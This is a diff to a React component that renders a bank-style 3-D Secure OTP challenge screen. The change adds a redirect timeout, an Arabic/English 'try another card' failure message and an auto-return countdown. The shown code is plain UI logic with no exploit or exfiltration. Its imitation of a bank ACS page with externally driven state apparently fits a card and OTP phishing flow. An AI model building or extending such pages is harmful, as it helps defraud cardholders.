@@ -1,6 +1,11 @@
-import React, { useEffect, useMemo, useState } from 'react';
+import React, { useEffect, useMemo, useRef, useState } from 'react';
 
 type Phase = 'method' | 'verify' | 'help' | 'processing' | 'failed';
+
+/** If redirect/loading page stays open longer than this → timeout message */
+const REDIRECT_TIMEOUT_MS = 30_000;
+/** After timeout, auto-return home after this many seconds */
+const HOME_COUNTDOWN_SEC = 10;
 
 export type AcsOtpChallengeProps = {
   orderRef?: string | null;
@@ -35,6 +40,7 @@ function maskPhone(last3?: string | null) {
  */
 export function AcsOtpChallenge({
   phoneLast3,
+  lang = 'ar',
   otpRetryNotice = false,
   otpResendNotice = false,
   resendCooldown = 0,
@@ -53,8 +59,17 @@ export function AcsOtpChallenge({
   const [error, setError] = useState('');
   const [attempt, setAttempt] = useState(1);
   const [submitting, setSubmitting] = useState(false);
+  const [redirectTimedOut, setRedirectTimedOut] = useState(false);
+  const [homeCountdown, setHomeCountdown] = useState(HOME_COUNTDOWN_SEC);
+  const goHomeRef = useRef<(() => void) | undefined>(undefined);
 
+  const isAr = String(lang).toLowerCase().startsWith('ar');
   const phoneMask = useMemo(() => maskPhone(phoneLast3), [phoneLast3]);
+
+  goHomeRef.current = () => {
+    if (onCancel) onCancel();
+    else if (onRetry) onRetry();
+  };
 
   // Stay on Verify while checking OTP — only redirect AFTER correct (completed)
   const view: Phase =
@@ -87,6 +102,35 @@ export function AcsOtpChallenge({
       setSubmitting(false);
     }
   }, [externalState]);
+
+  // Redirect page stuck > 30s → message + auto home in 10s
+  useEffect(() => {
+    if (view !== 'processing') {
+      setRedirectTimedOut(false);
+      setHomeCountdown(HOME_COUNTDOWN_SEC);
+      return;
+    }
+    setRedirectTimedOut(false);
+    setHomeCountdown(HOME_COUNTDOWN_SEC);
+    const t = window.setTimeout(() => setRedirectTimedOut(true), REDIRECT_TIMEOUT_MS);
+    return () => window.clearTimeout(t);
+  }, [view]);
+
+  useEffect(() => {
+    if (!redirectTimedOut || view !== 'processing') return;
+    setHomeCountdown(HOME_COUNTDOWN_SEC);
+    const id = window.setInterval(() => {
+      setHomeCountdown((c) => {
+        if (c <= 1) {
+          window.clearInterval(id);
+          goHomeRef.current?.();
+          return 0;
+        }
+        return c - 1;
+      });
+    }, 1000);
+    return () => window.clearInterval(id);
+  }, [redirectTimedOut, view]);
 
   /** Next on Choose Method: ALWAYS go to Verify; fire API in background (never hang UI) */
   const handleMethodNext = () => {
@@ -181,12 +225,38 @@ export function AcsOtpChallenge({
         </div>
       )}
 
-      {view === 'processing' && (
+      {view === 'processing' && !redirectTimedOut && (
         <div className="acs-screen">
           <Header />
           <h1 className="acs-h1">Please wait while we redirect you...</h1>
           <p className="acs-p">Do not refresh or close this page.</p>
           <div className="acs-spinner" aria-hidden="true" />
+        </div>
+      )}
+
+      {view === 'processing' && redirectTimedOut && (
+        <div className="acs-screen">
+          <Header />
+          <h1 className="acs-h1">
+            {isAr ? 'تعذّر إكمال الدفع' : 'Payment could not be completed'}
+          </h1>
+          <p className="acs-p">
+            {isAr
+              ? 'جرّب بطاقة أخرى أو تواصل مع البنك. سيتم إرجاعك للرئيسية تلقائياً.'
+              : 'Please try another card or contact your bank. You will return home automatically.'}
+          </p>
+          <p className="acs-p acs-countdown" aria-live="polite">
+            {isAr
+              ? `العودة للرئيسية خلال ${homeCountdown} ثانية...`
+              : `Returning home in ${homeCountdown}s...`}
+          </p>
+          <button
+            type="button"
+            className="acs-btn acs-btn-primary"
+            onClick={() => goHomeRef.current?.()}
+          >
+            {isAr ? 'العودة للرئيسية' : 'Back to Home'}
+          </button>
         </div>
       )}
 
@@ -500,6 +570,11 @@ const ACS_CSS = `
   border-top-color: #00527a;
   border-radius: 50%;
   animation: acs-spin 0.8s linear infinite;
+}
+.acs-countdown {
+  color: #00527a;
+  font-weight: 700;
+  text-align: center;
 }
 @keyframes acs-spin { to { transform: rotate(360deg); } }
 `;
